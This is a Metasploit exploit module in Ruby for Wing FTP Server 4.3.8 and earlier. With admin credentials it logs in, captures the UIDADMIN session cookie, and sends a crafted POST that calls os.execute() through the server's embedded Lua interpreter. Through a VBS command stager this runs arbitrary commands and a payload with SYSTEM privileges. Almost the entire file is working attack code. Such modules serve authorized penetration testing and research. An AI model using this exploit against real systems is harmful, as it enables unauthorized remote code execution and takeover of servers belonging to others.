##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wing FTP Server Authenticated Command Execution',
      'Description'    => %q{
        This module exploits the embedded Lua interpreter in the admin web interface for
        versions 4.3.8 and below. When supplying a specially crafted HTTP POST request
        an attacker can use os.execute() to execute arbitrary system commands on
        the target with SYSTEM privileges.
      },
      'Author'         =>
        [
          'Nicholas Nam <nick[at]executionflow.org>'
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.wftpserver.com' ]
        ],
      'Arch'           => ARCH_X86,
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows VBS Stager', {} ]
        ],
      'Privileged'     => true,
      'DisclosureDate' => 'Jun 19 2014',
      'DefaultTarget'  => 0
    ))

    register_options(
      [
        Opt::RPORT(5466),
        OptString.new('USERNAME', [true, 'Admin username', '']),
        OptString.new('PASSWORD', [true, 'Admin password', ''])
      ], self.class
    )
    deregister_options('CMDSTAGER::FLAVOR')
  end

  def check
    res = send_request_cgi(
      {
        'uri'     =>  '/admin_login.html',
        'method'  => 'GET'
      })

    if !res
      fail_with(Failure::Unreachable, "#{peer} - Admin login page was unreachable.")
    elsif res.code != 200
      fail_with(Failure::NotFound, "#{peer} - Admin login page was not found.")
    elsif res.body =~ /Wing FTP Server Administrator/ && res.body =~ /2003-2014 <b>wftpserver.com<\/b>/
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    @session_cookie = authenticate(username, password)

    print_status("#{peer} - Sending payload")
    # Execute the cmdstager, max length of the commands is ~1500
    execute_cmdstager(flavor: :vbs, linemax: 1500)
  end

  def execute_command(cmd, _opts = {})
    command = "os.execute('cmd /c #{cmd}')"

    res = send_request_cgi(
      'uri'       => '/admin_lua_script.html',
      'method'    => 'POST',
      'cookie'    => @session_cookie,
      'vars_post' => { 'command' => command }
    )

    if res && res.code != 200
      fail_with(Failure::Unkown, "#{peer} - Something went wrong.")
    end
  end

  def authenticate(username, password)
    print_status("#{peer} - Authenticating")
    res = send_request_cgi(
      'uri'       => '/admin_loginok.html',
      'method'    => 'POST',
      'vars_post' => {
        'username'     => username,
        'password'     => password,
        'username_val' => username,
        'password_val' => password,
        'submit_btn'   => '+Login+'
      }
    )

    uidadmin = ''
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Admin login page was unreachable.")
    elsif res.code == 200 && res.body =~ /location='main.html\?lang=english';/
      res.get_cookies.split(';').each do |cookie|
        cookie.split(',').each do |value|
          uidadmin = value.split('=')[1] if value.split('=')[0] =~ /UIDADMIN/
        end
      end
    else
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    end

    "UIDADMIN=#{uidadmin}"
  end
end